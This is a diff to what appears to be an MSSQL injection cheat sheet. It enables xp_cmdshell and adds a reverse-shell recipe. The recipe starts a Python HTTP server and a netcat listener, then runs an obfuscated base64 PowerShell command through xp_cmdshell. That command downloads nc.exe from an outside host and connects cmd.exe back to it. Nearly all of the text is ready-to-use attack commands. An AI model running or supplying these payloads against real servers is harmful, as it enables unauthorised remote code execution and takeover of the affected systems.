@@ -246,15 +246,23 @@ declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtre
 IS_SRVROLEMEMBER('sysadmin');
 
 -- Enable 'Advanced Options'
-EXEC sp_configure 'Show Advanced Options', '1';
-RECONFIGURE;
+EXEC sp_configure 'Show Advanced Options', '1';RECONFIGURE;
 
 -- Enable 'xp_cmdshell'
-EXEC sp_configure 'xp_cmdshell', '1';
-RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', '1';RECONFIGURE;
 
 -- Ping ourselves
 EXEC xp_cmdshell 'ping /n 4 192.168.43.164';
+
+--Reverse Shell create server at 4443 and listener at 4444
+sudo python3 -m http.server 4443
+
+sudo nc -lvnp 4444
+
+--this is base64 to give you shell
+EXEC xp_cmdshell 'powershell+-exec+bypass+-enc+KABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAGYAaQBsAGUAKAAiAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA3AC4AMQA0ADIAOgA0ADQANAAzAC8AbgBjAC4AZQB4AGUAIgAsACAAIgBjADoAXAB3AGkAbgBkAG8AdwBzAFwAdABhAHMAawBzAFwAbgBjAC4AZQB4AGUAIgApADsAIABjADoAXAB3AGkAbgBkAG8AdwBzAFwAdABhAHMAawBzAFwAbgBjAC4AZQB4AGUAIAAtAG4AdgAgADEAMAAuADEAMAAuADEANwAuADEANAAyACAANAA0ADQANAAgAC0AZQAgAGMAOgBcAHcAaQBuAGQAbwB3AHMAXABzAHkAcwB0AGUAbQAzADIAXABjAG0AZAAuAGUAeABlADsA';
+
+
 ```
 
 ### NetNTLM Hash Capture
